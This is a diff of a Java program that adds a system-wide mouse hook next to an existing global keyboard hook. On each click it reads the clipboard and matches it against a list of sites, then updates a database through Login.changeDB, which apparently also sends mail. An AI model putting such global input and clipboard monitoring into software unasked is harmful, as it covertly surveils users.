@@ -1,13 +1,16 @@
 import lc.kra.system.keyboard.GlobalKeyboardHook;
 import lc.kra.system.keyboard.event.GlobalKeyAdapter;
 import lc.kra.system.keyboard.event.GlobalKeyEvent;
+import lc.kra.system.mouse.GlobalMouseHook;
+import lc.kra.system.mouse.event.GlobalMouseEvent;
+import lc.kra.system.mouse.event.GlobalMouseListener;
+
 import java.awt.HeadlessException;
 import java.awt.Toolkit;
 import java.awt.datatransfer.DataFlavor;
 import java.awt.datatransfer.UnsupportedFlavorException;
 import java.io.*;
 import java.sql.Connection;
-import java.sql.PreparedStatement;
 import java.sql.SQLException;
 import java.util.ArrayList;
 import javax.mail.*;
@@ -35,6 +38,59 @@ public class Demo {
 	    bufferReader.close();
 	    
 		GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook();
+		GlobalMouseHook mousehook = new GlobalMouseHook();
+		mousehook.addMouseListener(new GlobalMouseListener() {
+			
+			@Override
+			public void mouseWheel(GlobalMouseEvent arg0) {
+				// TODO Auto-generated method stub
+				
+			}
+			
+			@Override
+			public void mouseReleased(GlobalMouseEvent arg0) {
+				// TODO Auto-generated method stub
+				
+			}
+			
+			@Override
+			public void mousePressed(GlobalMouseEvent arg0) {
+				// TODO Auto-generated method stub
+				String clipboardTXT = getClipBoard();
+				
+				for(int i=0;i<counter;i++)
+				{
+					
+					if(clipboardTXT.contains(siteList.get(i)) && !(clipboardTXT.equals(temp)))
+					{
+						try {
+							Login.changeDB(siteList.get(i),1);
+						} catch (AddressException e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						} catch (MessagingException e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						}
+						System.out.println("BINGO");
+						temp = clipboardTXT;
+						System.out.println(temp);
+						break;
+						
+					}
+						
+				}
+				
+				
+				
+			}
+			
+			@Override
+			public void mouseMoved(GlobalMouseEvent arg0) {
+				// TODO Auto-generated method stub
+				
+			}
+		});
 		System.out.println("Global keyboard hook successfully started, press [escape] key to shutdown.");
 		keyboardHook.addKeyListener(new GlobalKeyAdapter() {
 			@Override public void keyPressed(GlobalKeyEvent event) {
